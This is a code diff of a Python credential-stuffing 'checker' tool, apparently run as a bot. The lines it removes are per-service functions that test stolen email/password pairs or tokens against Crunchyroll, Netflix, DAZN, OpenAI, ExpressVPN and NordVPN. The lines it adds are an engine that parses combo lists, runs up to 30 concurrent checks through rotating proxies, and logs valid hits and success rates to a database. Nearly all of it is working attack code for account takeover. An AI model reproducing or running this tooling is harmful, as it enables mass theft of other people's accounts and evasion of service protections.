@@ -205,119 +205,98 @@ class ProxyManager:
 # ============================================
 # SERVICE CHECKERS
 # ============================================
-class ServiceCheckers:
-    @staticmethod
-    async def check_crunchyroll(email: str, password: str, proxy: Optional[str] = None) -> Dict:
+class CheckerEngine:
+    def __init__(self, proxy_manager: ProxyManager):
+        self.proxy_manager = proxy_manager
+        self.services = {
+            "crunchyroll": {"checker": ServiceCheckers.check_crunchyroll, "type": "email:pass", "label": "🍿 Crunchyroll"},
+            "netflix": {"checker": ServiceCheckers.check_netflix_token, "type": "token", "label": "📺 Netflix"},
+            "dazn": {"checker": ServiceCheckers.check_dazn, "type": "email:pass", "label": "⚽ DAZN"},
+            "openai": {"checker": ServiceCheckers.check_openai_token, "type": "token", "label": "🧠 OpenAI"},
+            "expressvpn": {"checker": ServiceCheckers.check_expressvpn, "type": "email:pass", "label": "🔒 ExpressVPN"},
+            "nordvpn": {"checker": ServiceCheckers.check_nordvpn, "type": "email:pass", "label": "🔐 NordVPN"},
+        }
+        self.semaphore = asyncio.Semaphore(30)
+        self.stats = {"total": 0, "valid": 0, "invalid": 0, "errors": 0, "by_service": {}}
+    
+    def _parse_credential(self, cred: str) -> Dict:
+        cred = cred.strip()
+        if ":" in cred and "@" in cred:
+            parts = cred.split(":", 1)
+            return {"email": parts[0].strip(), "password": parts[1].strip()}
+        elif cred.startswith("ey") or len(cred) > 30:
+            return {"token": cred}
+        else:
+            return {"raw": cred}
+    
+    async def check_single(self, service: str, credential: str, use_proxy: bool = True, user_id: int = 0, chat_id: int = 0) -> Dict:
+        async with self.semaphore:
+            proxy = await self.proxy_manager.get_proxy() if use_proxy else None
+            service_info = self.services.get(service)
+            if not service_info:
+                return {"valid": False, "status": "unknown_service"}
+            
+            checker = service_info["checker"]
+            parsed = self._parse_credential(credential)
+            
+            try:
+                result = await checker(**parsed, proxy=proxy)
+                if proxy:
+                    await self.proxy_manager.report_result(proxy, result.get("valid", False))
+                self._update_stats(service, result.get("valid", False))
+                await self._log_check(user_id, chat_id, service, credential[:50], result.get("valid", False), result.get("status", "unknown"), json.dumps(result), proxy)
+                result["proxy_used"] = proxy
+                return result
+            except Exception as e:
+                self.stats["errors"] += 1
+                await self._log_check(user_id, chat_id, service, credential[:50], False, "error", json.dumps({"error": str(e)}), proxy)
+                return {"valid": False, "status": "error", "error": str(e)}
+    
+    async def check_batch(self, service: str, credentials: List[str], use_proxy: bool = True, user_id: int = 0, chat_id: int = 0, max_workers: int = 20) -> List[Dict]:
+        sem = asyncio.Semaphore(max_workers)
+        async def limited_check(cred):
+            async with sem:
+                return await self.check_single(service, cred, use_proxy, user_id, chat_id)
+        
+        tasks = [limited_check(cred) for cred in credentials]
+        results = await asyncio.gather(*tasks, return_exceptions=True)
+        processed = []
+        for r in results:
+            if isinstance(r, Exception):
+                processed.append({"valid": False, "status": "error", "error": str(r)})
+            else:
+                processed.append(r)
+        return processed
+    
+    async def _log_check(self, user_id, chat_id, service, credential, valid, status, data, proxy):
         try:
-            async with aiohttp.ClientSession() as session:
-                async with session.get(
-                    "https://www.crunchyroll.com/",
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
-                    html = await resp.text()
-                    csrf_match = re.search(r'csrf_token["\s:]+"([^"]+)"', html)
-                    csrf = csrf_match.group(1) if csrf_match else ""
-                
-                async with session.post(
-                    "https://www.crunchyroll.com/login",
-                    data={"email": email, "password": password, "csrf_token": csrf},
-                    proxy=proxy,
-                    allow_redirects=False,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
-                    if resp.status == 302:
-                        return {"valid": True, "status": "active", "tier": "premium"}
-                    return {"valid": False, "status": "invalid"}
+            async with get_db() as db:
+                await db.execute(
+                    "INSERT INTO checks (user_id, chat_id, service, credential, valid, status, data, proxy_used) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                    (user_id, chat_id, service, credential, valid, status, data, proxy or "")
+                )
+                await db.execute(
+                    "INSERT OR REPLACE INTO users (user_id) VALUES (?)",
+                    (user_id,)
+                )
+                await db.commit()
         except Exception as e:
-            return {"valid": False, "status": "error", "error": str(e)}
+            logger.error(f"Failed to log check: {e}")
     
-    @staticmethod
-    async def check_netflix_token(token: str, proxy: Optional[str] = None) -> Dict:
-        try:
-            async with aiohttp.ClientSession() as session:
-                headers = {
-    "Authorization": f"Bearer {token}",
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                }
-                async with session.get(
-                    "https://www.netflix.com/api/shakti/viper/metadata",
-                    headers=headers,
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
-                    if resp.status == 200:
-                        return {"valid": True, "status": "active"}
-                    return {"valid": False, "status": "expired"}
-        except:
-            return {"valid": False, "status": "error"}
+    def _update_stats(self, service: str, valid: bool):
+        self.stats["total"] += 1
+        if valid:
+            self.stats["valid"] += 1
+        else:
+            self.stats["invalid"] += 1
+        if service not in self.stats["by_service"]:
+            self.stats["by_service"][service] = {"total": 0, "valid": 0}
+        self.stats["by_service"][service]["total"] += 1
+        if valid:
+            self.stats["by_service"][service]["valid"] += 1
     
-    @staticmethod
-    async def check_dazn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.post(
-                    "https://login.dazn.com/v1/auth/login",
-                    json={"email": email, "password": password},
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
-                    if resp.status == 200:
-                        data = await resp.json()
-                        return {"valid": True, "status": "active", "region": data.get("region", "Unknown")}
-                    return {"valid": False, "status": "invalid"}
-        except:
-            return {"valid": False, "status": "error"}
-    
-    @staticmethod
-    async def check_openai_token(token: str, proxy: Optional[str] = None) -> Dict:
-        try:
-            async with aiohttp.ClientSession() as session:
-                headers = {"Authorization": f"Bearer {token}"}
-                async with session.get(
-                    "https://api.openai.com/v1/models",
-                    headers=headers,
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
-                    if resp.status == 200:
-                        return {"valid": True, "status": "active", "tier": "paid"}
-                    return {"valid": False, "status": "invalid"}
-        except:
-            return {"valid": False, "status": "error"}
-    
-    @staticmethod
-    async def check_expressvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.post(
-                    "https://www.expressvpn.com/api/v1/auth/login",
-                    json={"email": email, "password": password},
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
-                    if resp.status == 200:
-                        data = await resp.json()
-                        return {"valid": True, "status": "active", "plan": data.get("plan", "Unknown")}
-                    return {"valid": False, "status": "invalid"}
-        except:
-            return {"valid": False, "status": "error"}
-    
-    @staticmethod
-    async def check_nordvpn(email: str, password: str, proxy: Optional[str] = None) -> Dict:
-        try:
-            async with aiohttp.ClientSession() as session:
-                async with session.post(
-                    "https://api.nordvpn.com/v1/users/login",
-                    json={"email": email, "password": password},
-                    proxy=proxy,
-                    timeout=aiohttp.ClientTimeout(total=10)
-                ) as resp:
-                    if resp.status == 200:
-                        return {"valid": True, "status": "active"}
-                    return {"valid": False, "status": "invalid"}
-        except:
-            return {"valid": False, "status": "error"}
+    def get_stats(self) -> Dict:
+        return self.stats
 
 # ============================================
 # CHECKER ENGINE
